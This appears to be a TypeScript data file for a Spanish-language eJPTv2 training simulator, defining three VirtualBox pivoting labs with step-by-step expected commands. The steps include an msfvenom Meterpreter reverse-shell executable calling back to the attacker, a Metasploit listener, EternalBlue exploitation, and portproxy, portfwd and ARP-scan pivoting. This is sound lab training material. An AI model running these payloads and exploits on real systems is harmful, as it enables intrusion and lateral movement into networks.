/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { ScenarioConfig } from '../types';

export const SCENARIOS: ScenarioConfig[] = [
  {
    id: 'windows-portproxy-zorin',
    badge: 'Escenario 1 · Portproxy en Windows',
    title: 'Pivoting con Windows Intermedio (Portproxy)',
    subtitle: 'Kali Linux ➔ Windows (Dual-NIC) ➔ Zorin OS (Aislado vía SSH)',
    description:
      'Aprende a atravesar un equipo Windows intermedio con dos tarjetas de red utilizando netsh/portproxy de Metasploit para acceder a un servicio SSH en una máquina Linux (Zorin OS) aislada en la subred 10.10.10.0/24.',
    topologySummary: 'Kali (192.168.1.100) -> Windows Intermedia (192.168.1.50 / 10.10.10.2) -> Zorin OS (10.10.10.15)',
    isolatedSubnet: '10.10.10.0/24',
    successFlagMessage: '¡Acceso SSH concedido a zorin-target! Has completado el túnel de port forwarding exitosamente.',
    machines: [
      {
        id: 'kali',
        name: 'Kali Linux (Atacante)',
        os: 'Kali Linux',
        role: 'attacker',
        interfaces: [
          { name: 'eth0', type: 'bridge', ip: '192.168.1.100', netmask: '255.255.255.0' },
        ],
        services: [
          { port: 4444, protocol: 'tcp', service: 'msf-handler', isOpen: false },
          { port: 5000, protocol: 'tcp', service: 'http-server', isOpen: false },
        ],
        isCompromised: false,
      },
      {
        id: 'win-intermediate',
        name: 'Windows 10/7 (Intermedia)',
        os: 'Windows',
        role: 'intermediate',
        interfaces: [
          { name: 'Ethernet 1', type: 'bridge', ip: '192.168.1.50', netmask: '255.255.255.0' },
          { name: 'Ethernet 2', type: 'nat_isolated', ip: '10.10.10.2', netmask: '255.255.255.0' },
        ],
        services: [
          { port: 445, protocol: 'tcp', service: 'microsoft-ds', isOpen: true },
          { port: 2222, protocol: 'tcp', service: 'portproxy-ssh', isOpen: false },
        ],
        isCompromised: false,
        compromiseMethod: 'virus.exe (windows/meterpreter/reverse_tcp)',
      },
      {
        id: 'zorin-target',
        name: 'Zorin OS (Objetivo Aislado)',
        os: 'Zorin OS',
        role: 'target',
        interfaces: [
          { name: 'enp0s3', type: 'nat_isolated', ip: '10.10.10.15', netmask: '255.255.255.0' },
        ],
        services: [
          { port: 22, protocol: 'tcp', service: 'ssh', isOpen: true },
        ],
        isCompromised: false,
      },
    ],
    steps: [
      {
        id: 'step-1-ip',
        stepNumber: 1,
        title: 'Identificar la dirección IP del atacante',
        description: 'Comprueba tu IP en la interfaz puente de Kali Linux para saber qué dirección configurar en el payload de Metasploit.',
        whyInExam: 'En el examen eJPTv2 debes verificar qué interfaz conecta con el laboratorio antes de generar cualquier reverse shell o configurar LHOST.',
        hint: 'Ejecuta `hostname -I` o `ifconfig eth0`',
        expectedCommands: ['hostname -I', 'hostname -i', 'ifconfig', 'ip a', 'ip addr'],
      },
      {
        id: 'step-2-msfvenom',
        stepNumber: 2,
        title: 'Generar el payload malicioso con MSFvenom',
        description: 'Crea un ejecutable de Windows con reverse shell Meterpreter apuntando a tu IP atacante y al puerto 4444.',
        whyInExam: 'En escenarios donde el equipo intermedio requiere ejecución de artefactos, msfvenom genera el binario compatible con la arquitectura del sistema operativo.',
        hint: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > virus.exe',
        expectedCommands: [
          'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > virus.exe',
          'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o virus.exe',
        ],
      },
      {
        id: 'step-3-httpserver',
        stepNumber: 3,
        title: 'Servir el payload vía servidor web Python',
        description: 'Inicia un servidor HTTP en el puerto 5000 para permitir que la máquina Windows descargue el payload.',
        whyInExam: 'Python http.server es la forma más rápida y estándar en eJPTv2 para transferir binarios y herramientas a la máquina víctima.',
        hint: 'python3 -m http.server 5000',
        expectedCommands: [
          'python3 -m http.server 5000',
          'python -m SimpleHTTPServer 5000',
          'python3 -m http.server',
        ],
      },
      {
        id: 'step-4-handler',
        stepNumber: 4,
        title: 'Configurar el Listener en Metasploit y recibir sesión',
        description: 'Abre msfconsole, usa exploit/multi/handler con el payload correspondiente, configura LHOST/LPORT y ejecuta el handler. Al ejecutarse virus.exe en Windows, se recibirá la sesión 4.',
        whyInExam: 'El manejador multi/handler es fundamental para capturar conexiones entrantes de payloads stageless o staged.',
        hint: 'use exploit/multi/handler -> set PAYLOAD windows/meterpreter/reverse_tcp -> set LHOST 192.168.1.100 -> set LPORT 4444 -> run',
        expectedCommands: [
          'run',
          'exploit',
        ],
        autoActionOnSuccess: {
          type: 'create_session',
          details: { id: 4, platform: 'windows', remoteIp: '192.168.1.50', user: 'WINDOWS-PC\\Alumno' },
        },
      },
      {
        id: 'step-5-ipconfig',
        stepNumber: 5,
        title: 'Descubrir interfaces de red en Meterpreter',
        description: 'Dentro de la sesión de Meterpreter, ejecuta ipconfig para constatar que la máquina intermedia tiene una segunda interfaz en la red aislada (10.10.10.0/24).',
        whyInExam: 'El pivote comienza identificando que la máquina comprometida tiene doble interfaz: una conectada a nosotros y otra hacia una red privada interna.',
        hint: 'ipconfig',
        expectedCommands: ['ipconfig', 'ifconfig'],
      },
      {
        id: 'step-6-portproxy',
        stepNumber: 6,
        title: 'Configurar Port Forwarding con el módulo portproxy',
        description: 'Envía la sesión a segundo plano con background, usa post/windows/manage/portproxy, y redirige el puerto 2222 de Windows hacia el puerto 22 de Zorin OS (10.10.10.15).',
        whyInExam: 'portproxy aprovecha la funcionalidad nativa de netsh en Windows para redirigir tráfico TCP sin instalar software adicional.',
        hint: 'background -> use post/windows/manage/portproxy -> set CONNECT_ADDRESS 10.10.10.15 -> set CONNECT_PORT 22 -> set LOCAL_ADDRESS 0.0.0.0 -> set LOCAL_PORT 2222 -> set SESSION 4 -> run',
        expectedCommands: [
          'run',
          'exploit',
        ],
        autoActionOnSuccess: {
          type: 'add_portproxy',
          details: {
            localAddress: '192.168.1.50',
            localPort: 2222,
            targetAddress: '10.10.10.15',
            targetPort: 22,
            sessionId: 4,
          },
        },
      },
      {
        id: 'step-7-ssh',
        stepNumber: 7,
        title: 'Verificar el túnel conectándote por SSH',
        description: 'Abre una terminal bash en Kali y conéctate por SSH apuntando a la IP de Windows (192.168.1.50) en el puerto expuesto 2222.',
        whyInExam: 'Comprobar el túnel con un cliente estándar (ssh, curl, browser) demuestra que el port forwarding es bidireccional y transparente.',
        hint: 'ssh usuario_zorin@192.168.1.50 -p 2222 (o contraseña: password123)',
        expectedCommands: [
          'ssh usuario_zorin@192.168.1.50 -p 2222',
          'ssh -p 2222 usuario_zorin@192.168.1.50',
          'ssh usuario_zorin@192.168.1.50:2222',
        ],
        autoActionOnSuccess: {
          type: 'compromise_target',
          details: { machineId: 'zorin-target' },
        },
      },
    ],
  },
  {
    id: 'linux-autoroute-portfwd',
    badge: 'Escenario 2 · Metasploit Nativo (Linux)',
    title: 'Pivoting en Linux con route add y portfwd',
    subtitle: 'Kali Linux ➔ Ubuntu (Dual-NIC) ➔ Metasploitable 2 (HTTP 80 / FTP 21)',
    description:
      'Domina el enrutamiento interno de Metasploit mediante `route add <red> <máscara> <sesión>` y el comando nativo de Meterpreter `portfwd add` para extraer servicios HTTP y FTP de una máquina Metasploitable 2 aislada.',
    topologySummary: 'Kali (192.168.1.100) -> Ubuntu Intermedio (192.168.1.45 / 10.10.10.3) -> Metasploitable 2 (10.10.10.5)',
    isolatedSubnet: '10.10.10.0/24',
    successFlagMessage: '¡Servicios HTTP y FTP alcanzados con éxito a través del túnel Meterpreter! eJPTv2 skill validada.',
    machines: [
      {
        id: 'kali',
        name: 'Kali Linux (Atacante)',
        os: 'Kali Linux',
        role: 'attacker',
        interfaces: [
          { name: 'eth0', type: 'bridge', ip: '192.168.1.100', netmask: '255.255.255.0' },
        ],
        services: [
          { port: 4444, protocol: 'tcp', service: 'msf-handler', isOpen: false },
        ],
        isCompromised: false,
      },
      {
        id: 'ubuntu-intermediate',
        name: 'Ubuntu Linux (Intermedia)',
        os: 'Ubuntu Linux',
        role: 'intermediate',
        interfaces: [
          { name: 'enp0s3', type: 'bridge', ip: '192.168.1.45', netmask: '255.255.255.0' },
          { name: 'enp0s8', type: 'nat_isolated', ip: '10.10.10.3', netmask: '255.255.255.0' },
        ],
        services: [
          { port: 22, protocol: 'tcp', service: 'ssh', isOpen: true },
        ],
        isCompromised: false,
        compromiseMethod: 'linux/x64/meterpreter/reverse_tcp',
      },
      {
        id: 'metasploitable-target',
        name: 'Metasploitable 2 (Objetivo Aislado)',
        os: 'Metasploitable 2',
        role: 'target',
        interfaces: [
          { name: 'eth0', type: 'nat_isolated', ip: '10.10.10.5', netmask: '255.255.255.0' },
        ],
        services: [
          { port: 80, protocol: 'tcp', service: 'http', isOpen: true },
          { port: 21, protocol: 'tcp', service: 'ftp', isOpen: true },
        ],
        isCompromised: false,
      },
    ],
    steps: [
      {
        id: 'step-ping-test',
        stepNumber: 1,
        title: 'Verificar el aislamiento de red (Ping Test)',
        description: 'Ejecuta un ping desde Kali hacia la IP interna de Metasploitable 2 (10.10.10.5). Debe fallar para confirmar que no hay conexión directa.',
        whyInExam: 'Asegura que el objetivo está realmente aislado y que es obligatorio realizar pivoting.',
        hint: 'ping -c 2 10.10.10.5',
        expectedCommands: ['ping -c 2 10.10.10.5', 'ping -c 3 10.10.10.5', 'ping -c 1 10.10.10.5', 'ping 10.10.10.5'],
      },
      {
        id: 'step-msf-handler-linux',
        stepNumber: 2,
        title: 'Configurar el Multi/Handler para Linux x64',
        description: 'Inicia msfconsole, configura exploit/multi/handler con el payload linux/x64/meterpreter/reverse_tcp, establece LHOST y ejecuta run para recibir la sesión 2 de la máquina Ubuntu.',
        whyInExam: 'En entornos Linux, el payload x64 Meterpreter ofrece soporte completo para el comando portfwd nativo.',
        hint: 'use exploit/multi/handler -> set PAYLOAD linux/x64/meterpreter/reverse_tcp -> set LHOST 192.168.1.100 -> run',
        expectedCommands: ['run', 'exploit'],
        autoActionOnSuccess: {
          type: 'create_session',
          details: { id: 2, platform: 'linux', remoteIp: '192.168.1.45', user: 'ubuntu' },
        },
      },
      {
        id: 'step-ifconfig-meterpreter',
        stepNumber: 3,
        title: 'Inspeccionar interfaces de red en Meterpreter',
        description: 'Ejecuta ifconfig en la sesión de Meterpreter para verificar la segunda interfaz conectada a la subred 10.10.10.0/24.',
        whyInExam: 'Permite descubrir el rango de direcciones IP de la red interna privada.',
        hint: 'ifconfig o ipconfig',
        expectedCommands: ['ifconfig', 'ipconfig'],
      },
      {
        id: 'step-route-add',
        stepNumber: 4,
        title: 'Añadir la ruta hacia la red interna en Metasploit',
        description: 'Pon la sesión en segundo plano (background) y añade una ruta en msfconsole para que Metasploit sepa llegar a 10.10.10.0/24 a través de la sesión 2.',
        whyInExam: 'El comando `route add` indica a los módulos auxiliares y exploits de Metasploit que enruten su tráfico a través de la sesión activa.',
        hint: 'background -> route add 10.10.10.0 255.255.255.0 2 (o route print para verificar)',
        expectedCommands: [
          'route add 10.10.10.0 255.255.255.0 2',
          'route add 10.10.10.0/24 2',
        ],
        autoActionOnSuccess: {
          type: 'add_route',
          details: { subnet: '10.10.10.0', netmask: '255.255.255.0', sessionId: 2 },
        },
      },
      {
        id: 'step-portfwd-http',
        stepNumber: 5,
        title: 'Traer el puerto HTTP (80) localmente con portfwd',
        description: 'Vuelve a entrar a la sesión 2 (sessions -i 2) y utiliza portfwd para redirigir el puerto local 5000 de Kali hacia el puerto 80 de Metasploitable 2 (10.10.10.5).',
        whyInExam: '`portfwd add -l <local_port> -p <target_port> -r <target_ip>` es la sintaxis dorada del examen eJPTv2 para traer servicios web a localhost.',
        hint: 'sessions -i 2 -> portfwd add -l 5000 -p 80 -r 10.10.10.5',
        expectedCommands: [
          'portfwd add -l 5000 -p 80 -r 10.10.10.5',
          'portfwd add -l 5000 -r 10.10.10.5 -p 80',
        ],
        autoActionOnSuccess: {
          type: 'add_portfwd',
          details: {
            localAddress: '127.0.0.1',
            localPort: 5000,
            targetAddress: '10.10.10.5',
            targetPort: 80,
            sessionId: 2,
          },
        },
      },
      {
        id: 'step-portfwd-ftp',
        stepNumber: 6,
        title: 'Traer el puerto FTP (21) localmente con portfwd',
        description: 'Añade otra regla portfwd para redirigir el puerto local 4000 hacia el puerto 21 de Metasploitable 2.',
        whyInExam: 'Permite interactuar con servicios no HTTP utilizando herramientas nativas del sistema como ftp o nc apuntando a 127.0.0.1.',
        hint: 'portfwd add -l 4000 -p 21 -r 10.10.10.5',
        expectedCommands: [
          'portfwd add -l 4000 -p 21 -r 10.10.10.5',
          'portfwd add -l 4000 -r 10.10.10.5 -p 21',
        ],
        autoActionOnSuccess: {
          type: 'add_portfwd',
          details: {
            localAddress: '127.0.0.1',
            localPort: 4000,
            targetAddress: '10.10.10.5',
            targetPort: 21,
            sessionId: 2,
          },
        },
      },
      {
        id: 'step-interact-services',
        stepNumber: 7,
        title: 'Interactuar con los servicios a través de localhost',
        description: 'Abre una pestaña bash en Kali e interactúa con el servicio web en http://127.0.0.1:5000 con curl o accede a ftp 127.0.0.1 4000.',
        whyInExam: 'Verifica la validez del port forwarding accediendo al banner de la aplicación interna desde el host atacante.',
        hint: 'curl http://127.0.0.1:5000 o ftp 127.0.0.1 4000',
        expectedCommands: [
          'curl http://127.0.0.1:5000',
          'curl 127.0.0.1:5000',
          'ftp 127.0.0.1 4000',
        ],
        autoActionOnSuccess: {
          type: 'compromise_target',
          details: { machineId: 'metasploitable-target' },
        },
      },
    ],
  },
  {
    id: 'windows-eternalblue-arp',
    badge: 'Escenario 3 · Windows SMB & ARP Scanner',
    title: 'Explotación completa Windows con EternalBlue y ARP Scanner',
    subtitle: 'Kali ➔ Windows 7 Intermedio (MS17-010) ➔ Escaneo ARP ➔ Objetivo Aislado (SMB 445)',
    description:
      'Escenario avanzado sin IPs conocidas en la red interna: explota la máquina intermedia mediante MS17-010, añade autoroute, descubre hosts internos sigilosamente con `arp_scanner`, expone el puerto 445 vía `portproxy` y compromete el objetivo final con un segundo exploit modificando LPORT.',
    topologySummary: 'Kali (192.168.1.100) -> Windows 7 Intermedia (192.168.1.60 / 10.10.10.4) -> Windows 7 Aislado (10.10.10.11)',
    isolatedSubnet: '10.10.10.0/24',
    successFlagMessage: '¡Segunda sesión de Meterpreter establecida en el Windows 7 aislado! Explotación transversal completada.',
    machines: [
      {
        id: 'kali',
        name: 'Kali Linux (Atacante)',
        os: 'Kali Linux',
        role: 'attacker',
        interfaces: [
          { name: 'eth0', type: 'bridge', ip: '192.168.1.100', netmask: '255.255.255.0' },
        ],
        services: [
          { port: 4444, protocol: 'tcp', service: 'msf-handler-session1', isOpen: false },
          { port: 5555, protocol: 'tcp', service: 'msf-handler-session2', isOpen: false },
        ],
        isCompromised: false,
      },
      {
        id: 'win7-intermediate',
        name: 'Windows 7 (Intermedia)',
        os: 'Windows 7',
        role: 'intermediate',
        interfaces: [
          { name: 'Local Area Connection 1', type: 'bridge', ip: '192.168.1.60', netmask: '255.255.255.0' },
          { name: 'Local Area Connection 2', type: 'nat_isolated', ip: '10.10.10.4', netmask: '255.255.255.0' },
        ],
        services: [
          { port: 445, protocol: 'tcp', service: 'microsoft-ds (SMB)', isOpen: true },
          { port: 5000, protocol: 'tcp', service: 'portproxy-smb', isOpen: false },
        ],
        isCompromised: false,
        compromiseMethod: 'exploit/windows/smb/ms17_010_eternalblue',
      },
      {
        id: 'win7-target',
        name: 'Windows 7 (Objetivo Aislado Desconocido)',
        os: 'Windows 7',
        role: 'target',
        interfaces: [
          { name: 'Local Area Connection', type: 'nat_isolated', ip: '10.10.10.11', netmask: '255.255.255.0' },
        ],
        services: [
          { port: 445, protocol: 'tcp', service: 'microsoft-ds (SMB)', isOpen: true },
        ],
        isCompromised: false,
      },
    ],
    steps: [
      {
        id: 'step-eternalblue-intermediate',
        stepNumber: 1,
        title: 'Explotar la máquina intermedia con EternalBlue',
        description: 'Usa el módulo exploit/windows/smb/ms17_010_eternalblue, configura RHOSTS con la IP de la máquina intermedia (192.168.1.60) y ejecuta el exploit.',
        whyInExam: 'MS17-010 es uno de los exploits más evaluados en certificaciones prácticas para comprometer hosts Windows antiguos y ganar acceso SYSTEM.',
        hint: 'use exploit/windows/smb/ms17_010_eternalblue -> set RHOSTS 192.168.1.60 -> run',
        expectedCommands: ['run', 'exploit'],
        autoActionOnSuccess: {
          type: 'create_session',
          details: { id: 1, platform: 'windows', remoteIp: '192.168.1.60', user: 'NT AUTHORITY\\SYSTEM' },
        },
      },
      {
        id: 'step-meterpreter-ipconfig',
        stepNumber: 2,
        title: 'Verificar interfaces en la sesión obtenida',
        description: 'En la sesión de Meterpreter, ejecuta ipconfig para observar la dirección IP de la segunda interfaz (10.10.10.4).',
        whyInExam: 'Confirmar el rango de red interna sobre el que se desplegará el enrutamiento.',
        hint: 'ipconfig',
        expectedCommands: ['ipconfig', 'ifconfig'],
      },
      {
        id: 'step-autoroute-module',
        stepNumber: 3,
        title: 'Enrutar tráfico hacia la red interna con post/multi/manage/autoroute',
        description: 'Envía la sesión a segundo plano (background), carga el post-módulo post/multi/manage/autoroute, asigna SESSION 1 y ejecuta run.',
        whyInExam: 'El módulo autoroute es más cómodo que el comando manual y añade automáticamente las subredes detectadas en la sesión.',
        hint: 'background -> use post/multi/manage/autoroute -> set SESSION 1 -> run (luego route print)',
        expectedCommands: ['run', 'exploit'],
        autoActionOnSuccess: {
          type: 'add_route',
          details: { subnet: '10.10.10.0', netmask: '255.255.255.0', sessionId: 1 },
        },
      },
      {
        id: 'step-arp-scanner',
        stepNumber: 4,
        title: 'Descubrir hosts vivos sigilosamente con ARP Scanner',
        description: 'Carga post/windows/gather/arp_scanner, configura RHOSTS con la subred interna 10.10.10.0/24 y SESSION 1. El escaneo descubrirá la máquina objetivo 10.10.10.11.',
        whyInExam: 'El escaneo ARP opera a nivel de capa 2 desde el host intermedio, evitando generar alertas de firewall ni requerir enrutamiento complejo.',
        hint: 'use post/windows/gather/arp_scanner -> set RHOSTS 10.10.10.0/24 -> set SESSION 1 -> run',
        expectedCommands: ['run', 'exploit'],
        autoActionOnSuccess: {
          type: 'discover_host',
          details: { ip: '10.10.10.11', mac: '08:00:27:fa:4a:91' },
        },
      },
      {
        id: 'step-portproxy-smb',
        stepNumber: 5,
        title: 'Reenviar el puerto SMB (445) a la máquina intermedia',
        description: 'Usa post/windows/manage/portproxy para que la máquina intermedia escuche en el puerto 5000 y lo reenvíe al puerto 445 del objetivo descubierto (10.10.10.11).',
        whyInExam: 'Dado que Windows ya tiene el puerto 445 ocupado localmente, debemos usar un puerto alternativo como LOCAL_PORT 5000 para el túnel.',
        hint: 'use post/windows/manage/portproxy -> set CONNECT_ADDRESS 10.10.10.11 -> set CONNECT_PORT 445 -> set LOCAL_ADDRESS 0.0.0.0 -> set LOCAL_PORT 5000 -> set SESSION 1 -> run',
        expectedCommands: ['run', 'exploit'],
        autoActionOnSuccess: {
          type: 'add_portproxy',
          details: {
            localAddress: '192.168.1.60',
            localPort: 5000,
            targetAddress: '10.10.10.11',
            targetPort: 445,
            sessionId: 1,
          },
        },
      },
      {
        id: 'step-exploit-target-smb',
        stepNumber: 6,
        title: 'Explotar la máquina objetivo final cambiando LPORT',
        description: 'Vuelve a usar exploit/windows/smb/ms17_010_eternalblue apuntando a RHOSTS 192.168.1.60, RPORT 5000 y cambiando obligatoriamente LPORT a 5555 para evitar colisiones con el puerto 4444 de la sesión 1.',
        whyInExam: 'Regla de oro del eJPTv2: Al lanzar una segunda sesión reversa hacia la misma IP de Kali, DEBES cambiar LPORT (ej. 5555) porque 4444 ya está en uso por la primera sesión.',
        hint: 'use exploit/windows/smb/ms17_010_eternalblue -> set RHOSTS 192.168.1.60 -> set RPORT 5000 -> set LPORT 5555 -> run',
        expectedCommands: ['run', 'exploit'],
        autoActionOnSuccess: {
          type: 'create_session',
          details: { id: 2, platform: 'windows', remoteIp: '10.10.10.11', user: 'NT AUTHORITY\\SYSTEM' },
        },
      },
    ],
  },
];

export const VIRTUALBOX_LAB_GUIDE = {
  title: 'Guía de Creación del Laboratorio en VirtualBox (Paso a Paso)',
  subnets: [
    {
      name: 'Adaptador Puente (Bridge)',
      description: 'Conecta tu Kali y la primera interfaz de la máquina intermedia a tu red local real para comunicación directa.',
      adapterSetting: 'Adaptador 1: Adaptador Puente (Bridged Adapter)',
    },
    {
      name: 'Red NAT Aislada (pingured / 10.10.10.0/24)',
      description: 'Red interna aislada donde conviven la segunda tarjeta de la máquina intermedia y la máquina objetivo. Kali NO tiene adaptador en esta red.',
      adapterSetting: 'VirtualBox > Archivo > Herramientas > Redes NAT > Crear red 10.10.10.0/24 (Deshabilitar DHCP opcional)',
    },
  ],
  commandsSummary: [
    {
      technique: 'Windows Netsh Portproxy',
      module: 'post/windows/manage/portproxy',
      syntax: 'set CONNECT_ADDRESS <IP_TARGET> ; set CONNECT_PORT <PORT> ; set LOCAL_PORT <PORT> ; set SESSION <ID>',
      description: 'Crea reglas nativas en el stack de red de Windows. No requiere mantener Meterpreter abierto para que el túnel funcione.',
    },
    {
      technique: 'Metasploit Route Add',
      module: 'route add / autoroute',
      syntax: 'route add 10.10.10.0 255.255.255.0 <SESSION_ID>',
      description: 'Permite que cualquier módulo o exploit de Metasploit alcance la subred remota a través de la sesión activa.',
    },
    {
      technique: 'Meterpreter Portfwd',
      module: 'portfwd (comando nativo)',
      syntax: 'portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <REMOTE_IP>',
      description: 'Mapea puertos de la red interna al localhost del atacante (127.0.0.1) a través de la conexión Meterpreter cifrada.',
    },
    {
      technique: 'Descubrimiento ARP Sigiloso',
      module: 'post/windows/gather/arp_scanner',
      syntax: 'set RHOSTS 10.10.10.0/24 ; set SESSION <ID>',
      description: 'Descubre equipos vivos en el segmento interno sin activar cortafuegos de paquetes IP.',
    },
  ],
};
